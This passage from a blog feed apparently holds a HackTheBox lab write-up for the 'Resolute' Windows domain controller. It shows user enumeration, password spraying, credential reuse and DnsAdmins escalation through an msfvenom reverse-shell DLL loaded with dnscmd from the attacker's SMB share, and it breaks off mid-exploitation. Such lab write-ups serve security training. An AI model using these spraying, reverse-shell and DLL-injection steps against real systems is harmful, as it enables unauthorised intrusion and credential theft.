+&lt;li>We can &lt;code>evil-winrm&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/monteverde/images/1.png">&lt;/p></description></item><item><title>[HTB] Machine: Resolute</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/</link><pubDate>Fri, 01 Sep 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/windows/resolute/</guid><description>&lt;h1 id="resolute">Resolute&lt;/h1>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p- 10.10.10.169 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 16:49 BST
+Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 30.27% done; ETC: 16:58 (0:06:20 remaining)
+Nmap scan report for 10.10.10.169 (10.10.10.169)
+Host is up (0.16s latency).
+Not shown: 65511 closed tcp ports (conn-refused)
+PORT STATE SERVICE
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+5985/tcp open wsman
+9389/tcp open adws
+47001/tcp open winrm
+49664/tcp open unknown
+49665/tcp open unknown
+49666/tcp open unknown
+49667/tcp open unknown
+49671/tcp open unknown
+49678/tcp open unknown
+49679/tcp open unknown
+49684/tcp open unknown
+49717/tcp open unknown
+50287/tcp open unknown
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>└─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.10.169 -T4
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 18:02 BST
+Nmap scan report for 10.10.10.169 (10.10.10.169)
+Host is up (0.17s latency).
+PORT STATE SERVICE VERSION
+53/tcp open domain Simple DNS Plus
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-04 17:08:39Z)
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp open microsof��λ�U Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp open kpasswd5?
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
+636/tcp open tcpwrapped
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open tcpwrapped
+5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open mc-nmf .NET Message Framing
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb-os-discovery:
+| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+| Computer name: Resolute
+| NetBIOS computer name: RESOLUTE\x00
+| Domain name: megabank.local
+| Forest name: megabank.local
+| FQDN: Resolute.megabank.local
+|_ System time: 2023-09-04T10:08:48-07:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: required
+| smb2-time:
+| date: 2023-09-04T17:08:49
+|_ start_date: 2023-09-04T15:51:23
+| smb2-security-mode:
+| 3:1:1:
+|_ Message signing enabled and required
+|_clock-skew: mean: 2h26m23s, deviation: 4h02m30s, median: 6m22s
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>smb&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ smbclient -N -L //10.10.10.169
+Anonymous login successful
+Sharename Type Comment
+--------- ---- -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>rpc&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ rpcclient -U &amp;#34;&amp;#34; -N 10.10.10.169
+rpcclient $&amp;gt; querydominfo
+Domain: MEGABANK
+Server:
+Comment:
+Total Users: 79
+Total Groups: 0
+Total Aliases: 0
+Sequence No: 1
+Force Logoff: -1
+Domain Server State: 0x1
+Server Role: ROLE_DOMAIN_PDC
+Unknown 3: 0x1
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>rpcclient $&amp;gt; querydispinfo
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail Name: (null) Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator Name: (null) Desc: Built-in account for administering the computer/domain
+index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: (null) Desc: (null)
+index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette Name: (null) Desc: (null)
+index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: (null) Desc: (null)
+index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: (null) Desc: (null)
+index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: (null) Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null) Desc: A user account managed by the system.
+index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia Name: (null) Desc: (null)
+index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null) Desc: (null)
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain
+index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo Name: (null) Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null) Desc: (null)
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie Name: (null) Desc: (null)
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki Name: (null) Desc: (null)
+index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo Name: (null) Desc: (null)
+index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per Name: (null) Desc: (null)
+index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan Name: Ryan Bertrand Desc: (null)
+index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally Name: (null) Desc: (null)
+index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon Name: (null) Desc: (null)
+index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve Name: (null) Desc: (null)
+index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: (null) Desc: (null)
+index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: (null) Desc: (null)
+index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf Name: (null) Desc: (null)
+index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null) Desc: (null)
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We can also dump information using &lt;code>ldapsearch&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>ldapsearch -H ldap://10.10.10.169 -x -b &amp;quot;DC=MEGABANK,DC=LOCAL&amp;quot; &lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="footholduser-1">Foothold/User #1&lt;/h2>
+&lt;ul>
+&lt;li>Okay, looks like &lt;code>marco&lt;/code> is newly created account with comment &lt;code>Account created. Password set to Welcome123!&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.169 -u marco -p &amp;#39;Welcome123!&amp;#39;
+SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\marco:Welcome123! STATUS_LOGON_FAILURE
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We could try password spraying with `Welcome123!
+&lt;ul>
+&lt;li>It could be that some of the users haven&amp;rsquo;t changed it yet&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ crackmapexec smb 10.10.10.169 -u users.list -p &amp;#39;Welcome123!&amp;#39; --continue-on-success
+SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\melanie:Welcome123!
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.10.10.169 445 RESOLUTE [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We have a hit &lt;code>melanie:Welcome123!&lt;/code>
+&lt;ul>
+&lt;li>Let&amp;rsquo;s try &lt;code>evil-winrm&lt;/code> and it works&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ evil-winrm -i 10.10.10.169 -u melanie -p &amp;#39;Welcome123!&amp;#39;
+Evil-WinRM shell v3.5
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\melanie\Documents&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="user-2">User #2&lt;/h2>
+&lt;ul>
+&lt;li>We have another user &lt;code>ryan&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\&amp;gt; ls -force users
+Directory: C:\users
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d----- 9/25/2019 10:43 AM Administrator
+d--hsl 7/16/2016 6:28 AM All Users
+d-rh-- 9/25/2019 10:17 AM Default
+d--hsl 7/16/2016 6:28 AM Default User
+d----- 12/4/2019 2:46 AM melanie
+d-r--- 11/20/2016 6:39 PM Public
+d----- 9/27/2019 7:05 AM ryan
+-a-hs- 7/16/2016 6:16 AM 174 desktop.ini
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Before running &lt;code>winpeas&lt;/code>, I will manually check obvious places&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\&amp;gt; ls -force c:\
+Directory: C:\
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+d--hs- 12/3/2019 6:40 AM $RECYCLE.BIN
+d--hsl 9/25/2019 10:17 AM Documents and Settings
+d----- 9/25/2019 6:19 AM PerfLogs
+d-r--- 9/25/2019 12:39 PM Program Files
+d----- 11/20/2016 6:36 PM Program Files (x86)
+d--h-- 9/25/2019 10:48 AM ProgramData
+d--h-- 12/3/2019 6:32 AM PSTranscripts
+d--hs- 9/25/2019 10:17 AM Recovery
+d--hs- 9/25/2019 6:25 AM System Volume Information
+d-r--- 12/4/2019 2:46 AM Users
+d----- 12/4/2019 5:15 AM Windows
+-arhs- 11/20/2016 5:59 PM 389408 bootmgr
+-a-hs- 7/16/2016 6:10 AM 1 BOOTNXT
+-a-hs- 9/4/2023 8:51 AM 402653184 pagefile.sys
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>C:\PSTranscripts&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; ls -force
+Directory: C:\PSTranscripts\20191203
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+-arh-- 12/3/2019 6:45 AM 3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s check the content&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Command start time: 20191203063455
+**********************
+PS&amp;gt;TerminatingError(): &amp;#34;System error.&amp;#34;
+&amp;gt;&amp;gt; CommandInvocation(Invoke-Expression): &amp;#34;Invoke-Expression&amp;#34;
+&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;#34;Command&amp;#34;; value=&amp;#34;-join($id,&amp;#39;PS &amp;#39;,$(whoami),&amp;#39;@&amp;#39;,$env:computername,&amp;#39; &amp;#39;,$((gi $pwd).Name),&amp;#39;&amp;gt; &amp;#39;)
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&amp;#34;
+&amp;gt;&amp;gt; CommandInvocation(Out-String): &amp;#34;Out-String&amp;#34;
+&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;#34;Stream&amp;#34;; value=&amp;#34;True&amp;#34;
+**********************
+Command start time: 20191203063455
+**********************
+PS&amp;gt;ParameterBinding(Out-String): name=&amp;#34;InputObject&amp;#34;; value=&amp;#34;PS megabank\ryan@RESOLUTE Documents&amp;gt; &amp;#34;
+PS megabank\ryan@RESOLUTE Documents&amp;gt;
+**********************
+Command start time: 20191203063515
+**********************
+PS&amp;gt;CommandInvocation(Invoke-Expression): &amp;#34;Invoke-Expression&amp;#34;
+&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&amp;#34;Command&amp;#34;; value=&amp;#34;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }&amp;#34;
+&amp;gt;&amp;gt; CommandInvocation(Out-String): &amp;#34;Out-String&amp;#34;
+&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;#34;Stream&amp;#34;; value=&amp;#34;True&amp;#34;
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS&amp;gt;CommandInvocation(Out-String): &amp;#34;Out-String&amp;#34;
+&amp;gt;&amp;gt; ParameterBinding(Out-String): name=&amp;#34;InputObject&amp;#34;; value=&amp;#34;The syntax of this command is:&amp;#34;
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException
++ FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotSpecified: (The syntax of this command is::String) [], RemoteException
++ FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>We found creds: &lt;code>ryan:Serv3r4Admin4cc123!&lt;/code>
+&lt;ul>
+&lt;li>If we check &lt;code>ryan&lt;/code> groups membership, we see that he can &lt;code>evil-winrm&lt;/code> since he&amp;rsquo;s in &lt;code>Contractors&lt;/code> group&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; net user ryan
+User name ryan
+Full Name Ryan Bertrand
+Comment
+User&amp;#39;s comment
+Country/region code 000 (System Default)
+Account active Yes
+Account expires Never
+Password last set 9/4/2023 10:36:02 AM
+Password expires Never
+Password changeable 9/5/2023 10:36:02 AM
+Password required Yes
+User may change password Yes
+Workstations allowed All
+Logon script
+User profile
+Home directory
+Last logon Never
+Logon hours allowed All
+Local Group Memberships
+Global Group memberships *Domain Users *Contractors
+The command completed successfully.
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\PSTranscripts\20191203&amp;gt; net localgroup &amp;#34;Remote Management Users&amp;#34;
+Alias name Remote Management Users
+Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+Members
+-------------------------------------------------------------------------------
+Contractors
+melanie
+The command completed successfully.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Let&amp;rsquo;s connect&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ evil-winrm -i 10.10.10.169 -u ryan -p &amp;#39;Serv3r4Admin4cc123!&amp;#39;
+Evil-WinRM shell v3.5
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="root">Root&lt;/h2>
+&lt;ul>
+&lt;li>&lt;code>ryan&lt;/code>&amp;rsquo;s full group membership
+&lt;ul>
+&lt;li>&lt;code>ryan&lt;/code> is a member of &lt;a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins" target="_blank" rel="noopener">DnsAdmins&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan&amp;gt; whoami /groups
+GROUP INFORMATION
+-----------------
+Group Name Type SID Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors Group S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins Alias S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label S-1-16-8192
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Found a &lt;code>note.txt&lt;/code> on &lt;code>ryan&lt;/code>&amp;rsquo;s desktop&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan&amp;gt; type desktop\note.txt
+Email to team:
+- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>There is a nice &lt;a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">post&lt;/a> about privilege escalation from &lt;code>DnsAdmins&lt;/code> to &lt;code>System&lt;/code>
+&lt;ul>
+&lt;li>Also &lt;a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" target="_blank" rel="noopener">https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin" target="_blank" rel="noopener">https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>We will use &lt;a href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/" target="_blank" rel="noopener">dnscmd&lt;/a>
+&lt;ul>
+&lt;li>First, we generate payload using &lt;code>msfvenom&lt;/code>
+&lt;ul>
+&lt;li>But in my case the payload didn&amp;rsquo;t work, since it can detected by &lt;code>AV&lt;/code>&lt;/li>
+&lt;li>So do not upload it to box&lt;/li>
+&lt;li>Or we have an option to build our own &lt;code>dll&lt;/code>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/dim0x69/dns-exe-persistance.git" target="_blank" rel="noopener">https://github.com/dim0x69/dns-exe-persistance.git&lt;/a>&lt;/li>
+&lt;li>It requires &lt;code>Visual Studio 2017&lt;/code>&lt;/li>
+&lt;li>We also need &lt;code>c++&lt;/code> reverse shell code&lt;/li>
+&lt;li>Watch &lt;a href="https://www.youtube.com/watch?v=8KJebvmd1Fk&amp;amp;list=PLidcsTyj9JXI9E9dT1jgXxvTOi7Pq_2c5&amp;amp;index=11" target="_blank" rel="noopener">ippsec&amp;rsquo;s video&lt;/a> how to do that&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=6666 -f dll &amp;gt; evil.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Now we need to register &lt;code>dll&lt;/code>
+&lt;ul>
+&lt;li>We could upload it or share it via &lt;code>smb&lt;/code>&lt;/li>
+&lt;li>Start &lt;code>impacket-smbserver&lt;/code>&lt;/li>
+&lt;li>Then load &lt;code>evil.dll&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>└─$ impacket-smbserver share $(pwd) -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan&amp;gt; dnscmd.exe localhost /config /serverlevelplugindll \\10.10.16.5\share\evil.dll
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>Next we need restart &lt;code>dns&lt;/code> service&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>*Evil-WinRM* PS C:\Users\ryan\Documents&amp;gt; sc.exe stop dns
+SERVICE_NAME: dns
+TYPE : 10 WIN32_OWN_PROCESS
+STATE : 3 STOP_PENDING
+(STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+WIN32_EXIT_CODE : 0 (0x0)
